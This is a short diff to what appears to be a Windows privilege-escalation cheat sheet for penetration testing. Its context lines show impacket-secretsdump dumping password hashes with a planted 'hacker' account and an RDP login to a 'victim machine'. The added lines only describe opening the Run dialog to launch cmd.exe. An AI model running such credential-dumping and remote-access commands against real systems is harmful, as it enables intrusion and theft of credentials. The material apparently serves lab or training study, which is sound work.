@@ -1445,6 +1445,8 @@ net users #check the new user
 ````
 impacket-secretsdump hacker:password@<IP of victim machine> -outputfile hashes 
 rdekstop -u hacker -p password <IP of victim machine>
+windows + R #Windows and R key at the same time
+[cmd.exe] # enter exe file you want in the prompt
 ````
 ### SeImpersonate
 #### PrintSpoofer
